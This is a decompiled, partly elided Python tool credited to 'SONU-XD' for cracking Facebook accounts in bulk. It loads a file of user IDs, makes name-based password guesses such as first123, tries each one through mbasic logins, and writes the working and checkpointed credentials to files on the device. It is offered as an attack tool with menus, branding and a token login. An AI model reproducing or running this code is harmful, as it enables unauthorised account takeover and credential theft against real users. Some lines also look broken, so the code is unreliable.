# Decompile by : SONU-XD
import os,sys
try: import requests
except ModuleNotFoundError:print("happy Install Module requests");os.system("python -m pip install requests &> /dev/happy")
try: import bs4
except ModuleNotFoundError:print("happy Install Module bs4");os.system("python -m pip install bs4 &> /dev/happy")
try: import mechanize
except ModuleNotFoundError:print("happy Install Module mechanize");os.system("python -m pip install mechanize &> /dev/happy")
try: import gTTS
except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/happy")
## import in
...
def R():
			...
			print(" \033[1;97m{1} Crack File  ")
			print(" \033[1;97m{2} Facebook ")
			print (" \033[1;97m{0} Log Out") 
			print (' \033[1;97m═════════════════════════════════════════════════')
			key = input(" {♡} \033[1;97mSelect ➵ ")
			print (' \033[1;97m═════════════════════════════════════════════════')
			if key in [""]:
				print (" {♡} \033[1;97mIncorrect Selected")
				exit()
			elif key in ["1", "01"]:
				time.sleep(0.5)
				__crack__().plerr()
				...
				time.sleep(0.5)
				os.system('xdg-open https://www.facebook.com/clark.magtuba')
...
def login():
	...
	try:
			...
			ts.write(tok)
			ts.close()
			print("\n\n{♡} \033[1;97mLogin Successful as " + name )
			time.sleep(1)
			R()
	except KeyError:
			print('\n\n{♡} \033[1;97mToken Expired ')
			time.sleep(1)
			login()
...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		print('\033[1;97m The Prosess Done...')
		print('\033[1;97mTotal OK : %s •  Total CP : %s'%(str(len(ok)),str(len(cp))));exit()
...
class __crack__:
	...
	def plerr(self):
		try:
			self.apk = input(" \033[1;97m{♡} File ➵ ")
			print (' \033[1;97m═════════════════════════════════════════════════')
			self.id = open(self.apk).read().splitlines()
			print(' \033[1;97m{♡} Total Id ➵ %s'%(len(self.id)))
			print (' \033[1;97m═════════════════════════════════════════════════')
			print(' \033[1;97m{♡}\033[1;97m    Method\033[1;97m')
			print (' \033[1;97m═════════════════════════════════════════════════')
		except:
			print('\n {♡} File Not Found ')
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m{ SONU-XD} \033[1;97m%s/%s   \033[1;97m{ OK-:%s }  \033[1;97m{ CP-:%s } '%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;97m{SONU-OK} %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/SONU_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
				...
				try:
					...
					cp.append(wrt)
					open('/sdcard/SONU_CP.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;97m{SONU-CP} %s | %s%s      ' % (user,pw,tahun(user)))
		...
		loop += 1
	def __pler__(self):
		print ("\033[1;97m {1} Auto 5 Pass { Fast } ")
		print (" {2} Auto 2 Digit Pass { Fast } ")
		print (" {3} Auto 4 Pass { Slow }")
				...
				for yntkts in self.id:
					try:
						...
						if len(xz) == 1:
							...
							pwx = [firstlast, xz[0] + 'first123', xz[0] + 'fitst12345', xz[0] + 'first last']
						elif len(xz) == 3:
							pwx = [name, xz[0]+xz[1]]
						elif len(xz) == 4:
							pwx = [name, xz[0]+xz[1]]
...
\033[1;97m ▒█▄▄▄█ ▒█▄▄▄█ ▒█░░▀█ ░▀▄▄▀
\033[1;37m
\033[1;91m \033[1;97m════𝐏𝐑𝐎𝐔𝐃 𝐓𝐎 𝐁𝐄 𝐈𝐍𝐃𝐈𝐀𝐍════ \033[1;91m
\033[1;91m \033[1;97m═══════𝐇𝐀𝐏𝐏𝐘  𝐑𝐀𝐍𝐃𝐈═══════ \033[1;91m
\033[1;91m💔 \033[1;97m═════Love You Kim═════ \033[1;91m💔

\033[1;37m ═════════════════════════════════════════════════
\033[1;97m AUTHOR    \033[1;97m➵ SONU-XD
\033[1;97m FACEBOOK  \033[1;97m➵ SONU
\033[1;97m YOUTUBE   \033[1;97m➵ SONU TECH
\033[1;97m VERSION   \033[1;97m➵ 5.0
\
\033[1;37m ═════════════════════════════════════════════════"""
ct = datetime.now()
n = ct.month
